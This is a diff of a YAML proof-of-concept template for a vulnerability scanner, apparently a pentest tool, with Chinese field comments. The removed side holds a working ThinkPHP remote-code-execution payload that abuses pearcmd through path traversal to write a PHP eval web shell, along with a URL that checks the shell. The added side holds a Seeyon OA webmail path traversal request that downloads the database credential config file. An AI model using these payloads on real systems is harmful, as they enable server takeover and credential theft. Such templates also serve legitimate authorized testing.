@@ -1,18 +1,18 @@
 #poc名称
 - name:
-  - name: "thinkphp_rce"
+  - name: "SeeyouOA_Webmail_Arbitrary_filedownload"
 
 #请求方式
 - method:
-  - method: "post"
+  - method: "get"
 
 #漏洞的位置
 - url:
-  - url : "/public/index.php"
+  - url : "/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
 
 #payload
 - payload:
-  - payload: "lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_REQUEST['cmd']);?>+/var/www/html/shell.php"
+  - payload: "isNone"
 
 #response包里状态码
 - status:
@@ -21,17 +21,16 @@
 #response包里的关键字
 - word:
   - word:
-      - "php_dir"
+      - "workflow"
 
 #验证是否攻击成功的 请求方式
 - method-V:
-  - method: "get"
+  - method: "isNone"
 
 #webshell位置
 - verify:
-  - verify : "/shell.php?cmd=phpinfo();"
+  - verify : "isNone"
 
 #cmd 为了适配Java反序列化漏洞
 - cmd:
   - cmd : "isNone"
-
